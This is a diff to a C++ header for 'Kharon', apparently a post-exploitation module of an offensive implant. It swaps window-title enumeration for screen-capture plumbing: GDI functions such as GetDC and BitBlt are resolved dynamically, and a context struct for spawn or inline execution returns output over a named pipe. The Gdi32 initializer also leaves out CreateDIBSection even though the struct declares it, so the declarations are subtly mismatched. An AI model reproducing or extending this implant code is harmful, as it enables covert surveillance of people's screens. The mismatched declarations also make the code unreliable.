@@ -4,12 +4,23 @@
 #include <Win32.h>
 
 typedef struct {
-    UINT32  CommandID;
+    ULONG Method; // method (spawn:0x10|inline:0x20)
+    
+    struct {
+        ULONG s; // pipe name length
+        PCHAR a; // pipe name ascii ptr
+    } Pipe;
+
+    struct {
+        ULONG s; // buff size
+        PVOID p; // buff ptr
+    } Buffer;
+} POST_CTX, *PPOST_CTX;
+
+typedef struct {
     PVOID   Buffer;
     SIZE_T  Length;
     SIZE_T  Size;
-    ULONG   Quantity;
-    BOOL    Encrypt;
 } PACKAGE, *PPACKAGE;
 
 typedef struct {
@@ -271,20 +282,14 @@ namespace Root {
             UPTR Length;
         } Base = {};        
 
-        struct {
-            PCHAR PipeName;
-            BOOL  Fork;
-        } Ctx = {};
+        PPOST_CTX Ctx = nullptr;
         
         struct {
             UPTR Handle;
 
-            DECLAPI( CreateNamedPipeA ); 
-            DECLAPI( WriteFile        );
-        
+            DECLAPI( CreateNamedPipeA );         
         } Krnl32 = {
             RSL_TYPE( CreateNamedPipeA ),
-            RSL_TYPE( WriteFile        )
         };
 
         struct {
@@ -304,17 +309,32 @@ namespace Root {
             RSL_TYPE( RtlReAllocateHeap ),
             RSL_TYPE( RtlFreeHeap       ),
         };
-                
+        
         struct {
             UPTR Handle;
 
-            DECLAPI( GetWindowTextA     );
-            DECLAPI( IsWindowVisible    ); 
-            DECLAPI( EnumDesktopWindows );
+            DECLAPI( GetCurrentObject );
+            DECLAPI( GetObjectW );
+            DECLAPI( CreateCompatibleDC );
+            DECLAPI( CreateDIBSection );
+            DECLAPI( SelectObject );
+            DECLAPI( BitBlt );
+        } Gdi32 = {
+            RSL_TYPE( GetCurrentObject ),
+            RSL_TYPE( GetObjectW ),
+            RSL_TYPE( CreateCompatibleDC ),
+            RSL_TYPE( SelectObject ),
+            RSL_TYPE( BitBlt )
+        };
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( GetSystemMetrics );
+            DECLAPI( GetDC );
         } User32 = {
-            RSL_TYPE( GetWindowTextA     ),
-            RSL_TYPE( IsWindowVisible    ),
-            RSL_TYPE( EnumDesktopWindows )
+            RSL_TYPE( GetSystemMetrics ),
+            RSL_TYPE( GetDC )
         };
 
         explicit Kharon();
@@ -324,18 +344,8 @@ namespace Root {
         ) -> VOID;
 
         auto Start(
-            _In_ UPTR Argument
+            VOID
         ) -> VOID;
-
-        auto CALLBACK EnumWinProc(
-            _In_ HWND   WinHandle,
-            _In_ LPARAM Parameter
-        ) -> BOOL;
-
-        auto CALLBACK StaticEnumWinProc(
-            _In_ HWND   WinHandle, 
-            _In_ LPARAM Parameter
-        ) -> BOOL;
 
         VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
         VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
